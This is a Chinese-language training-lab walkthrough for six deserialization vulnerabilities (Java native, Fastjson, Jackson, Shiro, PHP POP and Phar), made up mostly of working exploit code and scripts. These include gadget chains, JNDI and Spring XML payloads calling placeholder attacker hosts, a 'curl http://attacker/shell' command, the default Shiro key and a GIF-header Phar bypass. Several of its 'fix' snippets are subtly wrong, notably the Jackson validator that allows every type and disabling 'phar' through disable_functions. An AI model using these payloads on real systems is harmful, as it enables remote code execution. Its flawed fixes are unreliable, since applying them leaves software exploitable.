# 反序列化漏洞靶场通关手册

## 目录
- [第一章：Java原生反序列化漏洞](#第一章java原生反序列化漏洞)
- [第二章：Fastjson反序列化漏洞](#第二章fastjson反序列化漏洞)
- [第三章：Jackson反序列化漏洞](#第三章jackson反序列化漏洞)
- [第四章：Shiro反序列化漏洞](#第四章shiro反序列化漏洞)
- [第五章：PHP反序列化POP链漏洞](#第五章php反序列化pop链漏洞)
- [第六章：PHP Phar反序列化漏洞](#第六章php-phar反序列化漏洞)

---

## 第一章：Java原生反序列化漏洞

### 1.1 前置知识

**什么是Java原生反序列化漏洞？**

Java原生反序列化漏洞是指在应用程序中使用了`ObjectInputStream.readObject()`方法直接反序列化不可信的数据。当classpath中存在可利用的库（如Apache Commons Collections）时，攻击者可以构造恶意的序列化对象，在反序列化过程中执行任意代码。

**漏洞成因：**
- 直接使用`ObjectInputStream.readObject()`反序列化用户输入
- Classpath中存在反序列化gadget链（如Commons Collections、Spring等）
- 未对反序列化数据做任何验证

**影响版本：**
- Apache Commons Collections 3.1及以下
- 任何使用`ObjectInputStream.readObject()`的应用

### 1.2 环境准备

**启动靶场：**
```bash
cd /root/deserialization-range
docker-compose up -d
```

**访问漏洞页面：**
```
http://localhost:1008/vuln1
```

**工具下载：**
```bash
# 下载ysoserial工具
cd tools
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-0.0.6-all.jar

# 验证环境
docker ps | grep vuln-java
curl http://localhost:1008
```

### 1.3 手工测试方法

#### 步骤1：发现漏洞点

查看靶场页面，找到"提交序列化数据"的输入框。这是一个Base64编码的文本输入区域。

**漏洞入口分析：**
- URL: `POST /vuln1/deserialize`
- Content-Type: `application/json`
- 数据格式：Base64编码的序列化对象

#### 步骤2：构造Payload

**原理分析：**
利用Commons Collections的`ChainedTransformer`和`InvokerTransformer`实现命令执行。

**构造代码：**
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[] {String.class, Class[].class}, 
                new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", 
                new Class[] {Object.class, Object[].class}, 
                new Object[] {null, new Object[0]}),
            new InvokerTransformer("exec", 
                new Class[] {String.class}, 
                new Object[] {"touch /tmp/pwned"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();

        String payload = Base64.getEncoder().encodeToString(bos.toByteArray());
        System.out.println(payload);
    }
}
```

#### 步骤3：发送请求

使用curl发送Payload：
```bash
# 将生成的payload替换下面的PAYLOAD_BASE64
curl -X POST http://localhost:1008/vuln1/deserialize \
  -H "Content-Type: application/json" \
  -d 'PAYLOAD_BASE64'
```

#### 步骤4：验证结果

进入Java容器验证：
```bash
docker exec -it vuln-java bash
ls -la /tmp/pwned
```

如果文件存在，说明命令执行成功！

### 1.4 工具利用方法

**工具选择：**
ysoserial是Java反序列化利用的标准工具，支持多种gadget链。

**工具使用：**
```bash
cd tools
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64 -w 0
```

生成的Base64字符串可以直接提交到靶场。

**其他gadget链：**
```bash
# CommonsCollections2
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker/shell" | base64 -w 0

# CommonsCollections3
java -jar ysoserial.jar CommonsCollections3 "whoami > /tmp/result" | base64 -w 0
```

**工具原理：**
ysoserial预先实现了各种gadget链，自动构造恶意的序列化对象，无需手工编写Java代码。

### 1.5 修复方案

**代码层面修复：**
```java
// 使用SerialKiller或Apache Commons IO的ValidatingObjectInputStream
import org.apache.commons.io.input.ValidatingObjectInputStream;

ByteArrayInputStream bis = new ByteArrayInputStream(decoded);
ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bis);
ois.accept(Class.forName("java.lang.String"));
Object obj = ois.readObject();
```

**配置层面加固：**
- 升级Commons Collections到最新版本（3.2.2+）
- 移除不必要的依赖库
- 设置JVM参数禁止反序列化

**验证修复：**
```bash
# 升级后再次测试，应该无法利用
```

---

## 第二章：Fastjson反序列化漏洞

### 2.1 前置知识

**什么是Fastjson反序列化漏洞？**

Fastjson是阿里巴巴开源的JSON解析库。在解析JSON时，通过`@type`字段可以指定要反序列化的Java类。如果存在危险的类（如JNDI注入相关的类），攻击者可以实现远程代码执行。

**漏洞成因：**
- 使用`JSON.parseObject()`或`JSON.parse()`解析不可信的JSON
- Classpath中存在可利用的类（如`com.sun.rowset.JdbcRowSetImpl`）
- 未设置AutoType白名单

**影响版本：**
- Fastjson 1.2.24及以下

### 2.2 环境准备

**访问漏洞页面：**
```
http://localhost:1008/vuln2
```

**工具下载：**
```bash
# 下载marshalsec工具
cd tools
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests

# 或者使用JNDI-Injection-Exploit
git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
cd JNDI-Injection-Exploit
mvn clean package -DskipTests
```

### 2.3 手工测试方法

#### 步骤1：发现漏洞点

查看靶场页面，找到"提交JSON数据"的输入框。

**漏洞入口分析：**
- URL: `POST /vuln2/parse`
- Content-Type: `application/json`
- 数据格式：JSON字符串，可包含`@type`字段

#### 步骤2：构造Payload

**JNDI注入原理：**
Fastjson在反序列化`JdbcRowSetImpl`时，会调用`setDataSourceName()`方法设置JNDI名称，然后调用`setAutoCommit()`触发JNDI查询。

**Payload构造：**
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/Exploit",
    "autoCommit": true
}
```

#### 步骤3：发送请求

首先启动恶意的LDAP服务器：
```bash
cd tools/JNDI-Injection-Exploit/target
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "touch /tmp/fastjson_pwned"
```

然后发送Payload到靶场：
```bash
curl -X POST http://localhost:1008/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
```

#### 步骤4：验证结果

```bash
docker exec -it vuln-java bash
ls -la /tmp/fastjson_pwned
```

### 2.4 工具利用方法

**使用marshalsec：**
```bash
cd tools/marshalsec/target
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 1389

# 生成恶意class文件（在另一个终端）
cat > Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/marshalsec_pwned");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

javac Exploit.java
python -m http.server 8000
```

**一键利用脚本：**
```bash
#!/bin/bash
# fastjson_exploit.sh
ATTACKER_IP="127.0.0.1"
COMMAND="touch /tmp/pwned"

# 启动LDAP服务器
cd tools/JNDI-Injection-Exploit/target
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A $ATTACKER_IP -C "$COMMAND" &

sleep 2

# 发送Payload
curl -X POST http://localhost:1008/vuln2/parse \
  -H "Content-Type: application/json" \
  -d "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://$ATTACKER_IP:1389/Exploit\",\"autoCommit\":true}"

echo "Payload已发送，请验证结果"
```

### 2.5 修复方案

**代码层面修复：**
```java
// 方法1：升级Fastjson版本
// pom.xml中修改为：
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.68</version>
</dependency>

// 方法2：设置AutoType白名单
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
ParserConfig.getGlobalInstance().addAccept("com.yourpackage.");

// 方法3：使用ParserConfig
JSON.parseObject(jsonString, Object.class, ParserConfig.getGlobalInstance(), Feature.IgnoreAutoType);
```

**配置层面加固：**
- 升级到Fastjson 1.2.68+（开启SafeMode）
- 设置`ParserConfig.getGlobalInstance().setSafeMode(true)`
- 严格限制AutoType白名单

---

## 第三章：Jackson反序列化漏洞

### 3.1 前置知识

**什么是Jackson反序列化漏洞？**

Jackson是Java中常用的JSON处理库。当启用了`enableDefaultTyping`时，Jackson会在反序列化时根据类型信息创建对象。如果classpath中存在可利用的gadget链（如Spring框架），攻击者可以实现RCE。

**漏洞成因：**
- 使用`ObjectMapper.enableDefaultTyping()`
- Classpath中存在Spring框架或其他可利用的类
- 反序列化不可信的JSON数据

**影响版本：**
- Jackson 2.9.8及以下（CVE-2017-7525）
- Jackson 2.10.0及以下（CVE-2019-12384）

### 3.2 环境准备

**访问漏洞页面：**
```
http://localhost:1008/vuln3
```

### 3.3 手工测试方法

#### 步骤1：发现漏洞点

查看靶场页面，找到"提交JSON数据"的输入框。

#### 步骤2：构造Payload

**利用Spring的ClassPathXmlApplicationContext：**
```json
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/poc.xml"]
```

**poc.xml内容：**
```xml
<beans xmlns="http://www.springframework.org/schema/beans">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <list>
                <value>touch</value>
                <value>/tmp/jackson_pwned</value>
            </list>
        </constructor-arg>
    </bean>
    <bean id="cmd" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetObject" ref="pb"/>
        <property name="targetMethod" value="start"/>
    </bean>
</beans>
```

#### 步骤3：发送请求

```bash
# 启动HTTP服务器提供poc.xml
python3 -m http.server 8000

# 发送Payload
curl -X POST http://localhost:1008/vuln3/deserialize \
  -H "Content-Type: application/json" \
  -d '["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1:8000/poc.xml"]'
```

#### 步骤4：验证结果

```bash
docker exec -it vuln-java bash
ls -la /tmp/jackson_pwned
```

### 3.4 工具利用方法

**使用ysoserial生成Jackson payload：**
```bash
cd tools
java -jar ysoserial.jar Spring1 "touch /tmp/pwned" > payload.txt
```

**自动化脚本：**
```bash
#!/bin/bash
# jackson_exploit.sh

# 启动HTTP服务器
cd tools
python3 -m http.server 8000 > /dev/null 2>&1 &
HTTP_PID=$!

# 创建poc.xml
cat > poc.xml << 'EOF'
<beans xmlns="http://www.springframework.org/schema/beans">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>touch /tmp/jackson_tool_pwned</value>
            </list>
        </constructor-arg>
    </bean>
    <bean id="cmd" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetObject" ref="pb"/>
        <property name="targetMethod" value="start"/>
    </bean>
</beans>
EOF

# 发送Payload
curl -X POST http://localhost:1008/vuln3/deserialize \
  -H "Content-Type: application/json" \
  -d '["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1:8000/poc.xml"]'

echo "Payload已发送"

# 清理
kill $HTTP_PID
```

### 3.5 修复方案

**代码层面修复：**
```java
// 禁用DefaultTyping
ObjectMapper mapper = new ObjectMapper();
mapper.disable(JsonParser.Feature.ALLOW_SINGLE_QUOTES);

// 或者使用PolymorphicTypeValidator
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType(Object.class)
    .build();
mapper = new ObjectMapper();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
```

**配置层面加固：**
- 升级Jackson到2.10.0+（默认关闭DefaultTyping）
- 禁用`enableDefaultTyping()`
- 限制可反序列化的类型

---

## 第四章：Shiro反序列化漏洞

### 4.1 前置知识

**什么是Shiro反序列化漏洞？**

Apache Shiro是一个强大的Java安全框架。其RememberMe功能使用AES加密用户的序列化数据，存储在Cookie中。如果使用默认密钥或密钥泄露，攻击者可以构造恶意的序列化对象，实现RCE。

**漏洞成因：**
- Shiro使用硬编码的默认AES密钥
- RememberMe Cookie中的数据是AES加密的序列化对象
- 知道密钥即可解密并构造恶意Cookie

**影响版本：**
- Apache Shiro 1.2.4及以下（CVE-2016-4437）

### 4.2 环境准备

**访问漏洞页面：**
```
http://localhost:1008/vuln4
```

**工具下载：**
```bash
cd tools
# 下载shiro_attack工具
git clone https://github.com/Jayl1n/Shiro_attack.git

# 或者使用ysoserial配合自定义脚本
```

### 4.3 手工测试方法

#### 步骤1：发现漏洞点

查看靶场页面，找到登录表单。

**漏洞入口分析：**
- 登录后会设置RememberMe Cookie
- Cookie格式：`rememberMe=<AES加密的Base64字符串>`
- 默认密钥：`kPH+bIxk5D2deZiIxcaaaA==`

#### 步骤2：构造Payload

**理解Shiro加密流程：**
1. 序列化用户对象
2. 使用AES-CBC加密
3. Base64编码

**使用ysoserial生成序列化对象：**
```bash
cd tools
java -jar ysoserial.jar CommonsCollections2 "touch /tmp/shiro_pwned" > payload.bin
```

#### 步骤3：加密Payload

使用Shiro的加密方式加密：
```bash
# 使用shiro_attack工具
cd tools/Shiro_attack
python2 shiro_exploit.py http://localhost:1008/vuln4/check
# 选择gadget链（如CommonsCollections2）
# 输入命令：touch /tmp/shiro_pwned

# 工具会自动生成并设置Cookie
```

#### 步骤4：验证结果

```bash
docker exec -it vuln-java bash
ls -la /tmp/shiro_pwned
```

### 4.4 工具利用方法

**使用shiro_attack：**
```bash
cd tools/Shiro_attack
python2 shiro_exploit.py http://localhost:1008/vuln4/check

# 交互式选择：
# 1. 输入目标URL
# 2. 选择gadget链（推荐CommonsCollections2）
# 3. 输入命令
# 4. 自动生成并发送Payload
```

**使用ShiroExploit：**
```bash
cd tools
git clone https://github.com/Ares-X/ShiroExploit.git
cd ShiroExploit
python3 shiro_exploit.py http://localhost:1008/vuln4/check

# 自动检测密钥并生成Payload
```

### 4.5 修复方案

**代码层面修复：**
```java
// 方法1：使用自定义密钥
org.apache.shiro.crypto.AesCipherService cipher = new org.apache.shiro.crypto.AesCipherService();
byte[] key = java.util.Base64.getDecoder().decode("your-custom-base64-key");

// 方法2：升级Shiro版本
// pom.xml中修改为：
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.2.5</version>
</dependency>

// 方法3：禁用RememberMe功能
securityManager.setRememberMeManager(null);
```

**配置层面加固：**
- 升级到Shiro 1.2.5+（移除默认密钥）
- 使用强随机密钥
- 定期更换RememberMe密钥

---

## 第五章：PHP反序列化POP链漏洞

### 5.1 前置知识

**什么是PHP反序列化POP链？**

PHP反序列化POP（Property-Oriented Programming）是通过组合多个类的属性和方法，形成调用链来执行恶意代码的技术。与Java类似，PHP通过魔术方法（如`__destruct`、`__wakeup`、`__toString`）触发代码执行。

**漏洞成因：**
- 使用`unserialize()`反序列化不可信数据
- 代码中存在可利用的魔术方法
- 可以通过属性控制调用链

**影响版本：**
- PHP 5.x及7.x（某些特性在不同版本表现不同）

### 5.2 环境准备

**访问漏洞页面：**
```
http://localhost:1008/vuln5.php
```

**工具下载：**
```bash
cd tools
# 下载PHPGGC工具
git clone https://github.com/ambionics/phpggc.git
cd phpggc
composer install
```

### 5.3 手工测试方法

#### 步骤1：发现漏洞点

查看靶场页面，找到"提交序列化数据"的输入框。

**漏洞入口分析：**
- 表单提交Base64编码的序列化数据
- 使用`unserialize()`函数反序列化
- 可利用的类：`Vuln5POPChain`、`CommandExecutor`、`Logger`

#### 步骤2：构造Payload

**POP链思路：**
1. 利用`Logger`类的`__destruct()`方法
2. 调用`CommandExecutor`对象作为回调
3. `CommandExecutor`的`__invoke()`方法执行命令

**构造代码：**
```php
<?php
class CommandExecutor {
    private $command;
    
    public function __construct($command) {
        $this->command = $command;
    }
}

class Logger {
    private $logFile;
    private $callback;
    
    public function __construct($callback) {
        $this->logFile = "/tmp/log.txt";
        $this->callback = $callback;
    }
}

$cmd = new CommandExecutor("touch /tmp/php_pwned");
$obj = new Logger($cmd);
echo base64_encode(serialize($obj));
?>
```

#### 步骤3：发送请求

```bash
# 生成Payload
php -r '
class CommandExecutor {
    private $command;
    public function __construct($cmd) { $this->command = $cmd; }
}
class Logger {
    private $logFile;
    private $callback;
    public function __construct($cb) { $this->logFile = "/tmp/log.txt"; $this->callback = $cb; }
}
$cmd = new CommandExecutor("touch /tmp/php_pwned");
$obj = new Logger($cmd);
echo base64_encode(serialize($obj));
' > payload.txt

# 发送Payload
PAYLOAD=$(cat payload.txt)
curl -X POST http://localhost:1008/vuln5.php \
  -d "data=$PAYLOAD"
```

#### 步骤4：验证结果

```bash
docker exec -it vuln-php bash
ls -la /tmp/php_pwned
```

### 5.4 工具利用方法

**使用PHPGGC：**
```bash
cd tools/phpggc

# 生成monolog/RCE1的payload
./phpggc monolog/RCE1 system "touch /tmp/phpggc_pwned" | base64 -w 0

# 发送
PAYLOAD=$(./phpggc monolog/RCE1 system "touch /tmp/phpggc_pwned" | base64 -w 0)
curl -X POST http://localhost:1008/vuln5.php -d "data=$PAYLOAD"
```

**利用技巧 - 绕过__wakeup：**
在PHP 7.1.x及以下版本，可以通过修改属性数量绕过`__wakeup`：
```php
// 正常序列化：O:12:"Vuln5POPChain":2:{...}
// 绕过wakeup：O:12:"Vuln5POPChain":3:{...}
```

### 5.5 修复方案

**代码层面修复：**
```php
// 方法1：使用安全的反序列化函数
$obj = unserialize($data, ['allowed_classes' => ['SafeClass']]);

// 方法2：验证序列化数据
if (!preg_match('/^O:\d+:"SafeClass"/', $data)) {
    die("Invalid serialized data");
}

// 方法3：避免直接反序列化用户输入
// 使用JSON格式代替序列化
$obj = json_decode($json_data);
```

**配置层面加固：**
- 禁用`unserialize()`函数（通过disable_functions）
- 使用安全的序列化格式（JSON）
- 严格验证反序列化数据的来源和内容

---

## 第六章：PHP Phar反序列化漏洞

### 6.1 前置知识

**什么是PHP Phar反序列化漏洞？**

Phar（PHP Archive）是PHP的归档格式，类似于Java的JAR。Phar文件包含序列化的元数据（metadata），当通过`file_exists()`、`fopen()`、`file_get_contents()`等文件操作函数访问Phar文件时，会自动反序列化metadata，从而触发漏洞。

**漏洞成因：**
- 上传文件功能未正确验证
- 对上传的文件调用文件操作函数
- 未禁用phar://协议

**影响版本：**
- PHP 5.3.0及以上（支持Phar）

### 6.2 环境准备

**访问漏洞页面：**
```
http://localhost:1008/vuln6.php
```

### 6.3 手工测试方法

#### 步骤1：发现漏洞点

查看靶场页面，找到文件上传功能。

**漏洞入口分析：**
- 上传文件后会调用文件操作函数
- 代码使用`finfo`检测MIME类型，但可以通过伪造文件头绕过
- 上传后会调用`new Phar($filename)`，触发反序列化

#### 步骤2：构造Phar文件

**生成恶意Phar文件：**
```php
<?php
@unlink('poc.phar');

class CommandExecutor {
    private $command;
    
    public function __construct($cmd) {
        $this->command = $cmd;
    }
}

$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test content');
$phar->setMetadata(new CommandExecutor("touch /tmp/phar_pwned"));

// 伪造GIF文件头绕过检测
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();

echo "Phar文件已生成: poc.phar\n";
echo "文件大小: " . filesize('poc.phar') . " bytes\n";
?>
```

#### 步骤3：发送请求

```bash
# 生成Phar文件
php gen_phar.php

# 上传文件
curl -X POST http://localhost:1008/vuln6.php \
  -F "phar_file=@poc.phar;filename=image.gif"
```

#### 步骤4：验证结果

```bash
docker exec -it vuln-php bash
ls -la /tmp/phar_pwned
```

### 6.4 工具利用方法

**使用PHPGGC生成Phar：**
```bash
cd tools/phpggc

# 生成Phar文件
./phpggc -p phar monolog/RCE1 system "touch /tmp/phpggc_phar" > poc.phar

# 修改文件头
sed -i '1s/^/GIF89a/' poc.phar

# 上传
curl -X POST http://localhost:1008/vuln6.php \
  -F "phar_file=@poc.phar;filename=image.gif"
```

**自动化脚本：**
```bash
#!/bin/bash
# phar_exploit.sh

cd tools/phpggc

# 生成Phar payload
./phpggc -p phar monolog/RCE1 system "touch /tmp/auto_phar_pwned" > /tmp/poc.phar

# 添加GIF文件头
echo -n "GIF89a" | cat - /tmp/poc.phar > /tmp/poc.gif

# 上传
curl -X POST http://localhost:1008/vuln6.php \
  -F "phar_file=@/tmp/poc.gif;filename=image.gif"

echo "Phar文件已上传"
```

### 6.5 修复方案

**代码层面修复：**
```php
// 方法1：禁用phar://协议
// php.ini配置：
disable_functions = phpinfo,system,shell_exec,phar

// 方法2：验证文件内容
$imageinfo = getimagesize($uploaded_file);
if ($imageinfo === false) {
    die("Invalid image file");
}

// 方法3：重命名上传文件
$new_filename = uniqid() . '.dat';
rename($uploaded_file, $new_filename);

// 方法4：不直接使用文件名进行文件操作
// 使用文件内容而不是文件路径
```

**配置层面加固：**
- 禁用phar扩展（php.ini: `extension=phar` 改为 `;extension=phar`）
- 严格验证上传文件的MIME类型和内容
- 重命名上传文件，改变文件扩展名
- 限制文件上传目录的执行权限

---

## 附录：常见问题排查

### FAQ

**Q1: 反序列化Payload提交后没有反应？**
A: 检查以下几点：
- Payload是否正确编码（Base64、URL编码等）
- 请求方法是否正确（GET/POST）
- Content-Type是否正确
- 查看服务器日志：`docker logs vuln-java` 或 `docker logs vuln-php`

**Q2: ysoserial执行报错找不到类？**
A: 确保靶场启动正常：
```bash
docker ps | grep vuln
docker logs vuln-java
```

**Q3: Fastjson利用失败，提示"autoType is not support"？**
A: 该靶场使用的Fastjson 1.2.24默认支持AutoType。如果报错，检查：
- JSON格式是否正确
- Payload中的类名是否存在于classpath

**Q4: Shiro RememberMe Cookie设置失败？**
A: 检查：
- 登录请求是否成功
- 浏览器是否接受Cookie
- 查看Set-Cookie响应头

**Q5: PHP反序列化提示"Class not found"？**
A: 确保构造的类名与靶场代码中的类名完全一致（包括命名空间）

**Q6: Phar文件上传后被拒绝？**
A: 检查：
- 文件大小是否超过限制
- 文件名是否合法
- 服务器是否有写入权限

**Q7: 命令执行但没有文件创建？**
A: 可能原因：
- 命令执行错误
- 权限不足
- 文件路径不存在

**Q8: 如何调试反序列化过程？**
A: 在靶场代码中添加日志：
```java
log.info("Received data: {}", data);
```

**Q9: Docker容器无法访问外网？**
A: 检查网络配置：
```bash
docker network ls
docker network inspect deserialization-range_vuln-net
```

**Q10: 如何重置靶场环境？**
A: 停止并重新启动容器：
```bash
cd /root/deserialization-range
docker-compose down
docker-compose up -d
```

### Payload速查表

#### Java原生反序列化
```bash
# ysoserial生成
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64 -w 0

# 常用gadget链
- CommonsCollections1
- CommonsCollections2
- CommonsCollections3
- Spring1
- Spring2
```

#### Fastjson
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```

#### Jackson
```json
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/poc.xml"]
```

#### Shiro
```bash
# 默认密钥
kPH+bIxk5D2deZiIxcaaaA==

# 使用shiro_attack
python2 shiro_exploit.py http://target/check
```

#### PHP反序列化
```php
<?php
class CommandExecutor {
    private $command = "your_command";
}
$obj = new CommandExecutor();
echo base64_encode(serialize($obj));
?>
```

#### PHP Phar
```php
<?php
$phar = new Phar('poc.phar');
$phar->setMetadata(new CommandExecutor("your_command"));
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
?>
```

---

## 总结

本手册涵盖了6种经典反序列化漏洞的原理、利用和修复方法。通过系统学习，你应该能够：

1. 理解各种反序列化漏洞的原理和触发条件
2. 掌握手工构造Payload的方法
3. 熟练使用常用工具进行漏洞利用
4. 了解有效的修复方案

**学习建议：**
- 先理解原理，再动手实践
- 从简单的漏洞开始，逐步挑战复杂的利用链
- 记录遇到的问题和解决方法
- 思考如何防御这些攻击

**安全提醒：**
本靶场仅供学习和研究使用。反序列化漏洞具有严重危害，切勿在未经授权的系统上测试！

---

**祝你学习愉快！🎉**
